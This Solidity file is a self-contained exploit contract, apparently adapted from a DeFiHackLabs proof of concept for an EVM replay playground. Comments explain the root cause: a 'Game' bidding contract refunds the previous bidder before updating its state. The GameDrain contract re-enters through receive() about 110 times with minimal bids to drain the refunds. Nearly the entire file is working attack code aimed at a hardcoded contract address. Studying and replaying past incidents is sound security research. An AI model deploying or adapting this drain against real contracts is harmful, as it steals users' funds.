// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-02-Game).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (address(this) IS the attacker, and the `receive()` reentrancy callback lives
// on the test itself), so there is no standalone contract to deploy. This
// contract is a faithful, self-contained copy of that inline attack
// (testExploit -> run, receive, makeBadBid) so the playground can deploy it and
// record run(). Logic and constants are copied verbatim from
// test/Game_exp.sol.
//
// Root cause: Game.makeBid() refunds the previous high bidder's full stale
// `bidEther` via a raw call BEFORE updating `bidAddress`/`bidEther` (checks ->
// interaction -> effects). Because the required minimum to outbid is only 5%
// of the current bid, a self-reentrant attacker can loop the refund at the
// stale (large) bidEther value dozens of times for a tiny incremental cost.

interface IGame {
    function newBidEtherMin() external view returns (uint256);

    function makeBid() external payable;
}

contract GameDrain {
    IGame private constant Game = IGame(0x52d69c67536f55EfEfe02941868e5e762538dBD6);
    uint8 private reentrancyCalls;

    // step 0: seed as the high bidder with an honest bid, then start the
    // reentrant bad-bid loop via makeBadBid()/receive(). Takes the 0.6 ETH
    // seed capital as msg.value (rather than a pre-funding transfer) so that
    // funding this contract does not itself trigger receive() and start the
    // bad-bid loop prematurely -- receive() must stay dormant until the
    // honest bid below actually makes this contract the high bidder.
    function run() external payable {
        uint256 bid = (msg.value * 49) / 100;
        Game.makeBid{value: bid}();

        makeBadBid();
    }

    // step 1: each refund from Game.makeBid() re-enters here while bidEther is
    // still the stale (large) value from the honest bid above.
    receive() external payable {
        if (reentrancyCalls <= 109) {
            ++reentrancyCalls;
            makeBadBid();
        } else {
            return;
        }
    }

    // step 2: the bug: newBidEtherMin() is only 5% of the current (stale)
    // bidEther, so this cheap bid triggers a refund of the full stale amount.
    function makeBadBid() internal {
        uint256 badBid = Game.newBidEtherMin() + 1; // +1 because "bid is too low"
        Game.makeBid{value: badBid}();
    }
}
